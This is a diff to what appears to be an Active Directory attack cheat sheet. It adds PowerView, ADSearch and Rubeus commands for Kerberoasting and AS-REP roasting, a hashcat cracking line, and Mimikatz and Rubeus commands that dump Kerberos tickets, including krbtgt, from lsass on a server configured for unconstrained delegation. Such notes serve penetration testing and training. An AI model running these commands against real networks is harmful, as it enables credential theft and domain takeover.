@@ -25,13 +25,17 @@ First of all we need to find which users are used as *Service Accounts*:
 ```powershell
 Get-NetUser -SPN
 ```
+* PowerView (dev):
+```powershell
+Get-DomainUser -SPN
+```
 * ADModule:
 ```powershell
 Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
 ```
 * ADSearch:
 ```powershell
-C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(sAMAccountType=805306368)(servicePrincipalName=*))"
+.\ADSearch.exe --search "(&(sAMAccountType=805306368)(servicePrincipalName=*))"
 ```
 After enum it, we need to request a TGS:
 
@@ -114,7 +118,7 @@ To crack the ticket with hascat exists a script to export it to a hashcat format
 * https://github.com/jarilaos/kirbi2hashcat
 
 ```
-haschat -a 0 -m 13100 wordlist.txt ticket.txt
+haschat -a 0 -m 13100 ticket.txt wordlist.txt
 ```
 
 ### Mitigation
@@ -162,7 +166,15 @@ Get-ADUser -Filter {DoesNotRequiredPreAuth -eq $True} -Properties DoesNotRequire
 
 * ADSearch:
 ```powershell
-C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(sAMAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
+.\ADSearch.exe --search "(&(sAMAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
+```
+
+###  Requesting a ticket
+
+With `Rubeus` we can request a ASREP ticket.
+
+```
+.\Rubeus.exe asreproast /user:asrepuser /nowrap
 ```
 
 ### Cracking the tickets
@@ -218,9 +230,26 @@ C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=co
 
 To exploit the unconstrained delgation and extract the user's TGT from lsass, we need to compromise the server as local admin.
 
+* Invoke-Mimikatz
+
 ```powershell
 Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
 ```
+
+* Rubeus
+
+With Rubeus we can list the tickets.
+
+```
+.\Rubeus.exe triage
+```
+
+And we can download one specifing the LUID and Service:
+
+```
+.\Rubeus.exe dump /luid:0x3e8 /service:krbtgt /nowrap
+```
+
 If any interesting ticket is located on the server, we will need to wait until a interesting user connects to the compromised server. We can use `Invoke-UserHunter` to see if the targeted user connects to the server:
 
 ```powershell
